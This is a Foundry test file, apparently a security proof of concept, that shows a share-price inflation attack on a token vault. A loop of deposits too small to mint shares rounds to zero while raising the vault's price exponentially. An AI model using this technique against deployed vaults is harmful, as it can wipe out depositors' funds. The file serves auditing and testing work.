// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.21;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "forge-std/mocks/MockERC20.sol";
import {Vault} from "../src/Vault.sol";

contract VaultTest is Test {
    Vault public vault;
    MockERC20 public asset;

    function setUp() public {
        asset = new MockERC20();
        vault = new Vault(address(asset));
        deal(address(asset), address(this), type(uint256).max);
        asset.approve(address(vault), type(uint256).max);
    }

    function test_inflatePrice() public {
        uint256 price = vault.getPrice();
        assertEq(price, 1.01e18);
        // if we deposit less than what 1 share is worth, we will always mint 0 shares (due to rounding)
        // and increase the totalAssets by a large amount
        for (uint256 i = 0; price < 1e36; i++) {
            // shares = deposit * 1e18 / price = deposit * 1e18 / (totalAssets * 1e18 / totalSupply)
            // shares < 1 <=> deposit < price / 1e18
            uint256 deposit = price / 1e18;
            // if there is no remainder in the division, the price will not change, the attack would be stuck.
            // we need to choose a different deposit
            if (deposit * 1e18 == price) {
                // just decrease by 1, not sure if this actually always works
                deposit -= 1;
            }
            uint256 shares = vault.deposit(deposit, address(this));
            assertEq(shares, 0);
            // the donation keeps increasing, the share price increases exponentially
            console.log("%s - donation:", i, deposit);

            price = vault.getPrice();
            console.log("%s - price:", i, price);
        }

        // the price is really high now
        assertGt(price, 1e36);
        vm.expectRevert();
        vault.mockError();
    }
}
